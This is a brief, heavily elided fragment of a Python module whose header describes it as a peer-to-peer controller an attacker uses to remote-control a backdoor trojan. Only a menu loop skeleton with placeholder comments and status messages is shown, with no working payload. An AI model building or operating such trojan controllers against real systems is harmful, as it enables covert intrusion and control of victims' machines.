...
#
# Purpose:     This module is a p2p connection controller to the backdoor trojan
#              for the attacker to remote control the malware action. The malware 
#              action currently provided are:
...
while True:
    ...
    # Insert malware
        ...
        print("Disconnect to the trojan ...")
        exit()
    else: 
        print("The input selection is not valid or the function is not ready.")
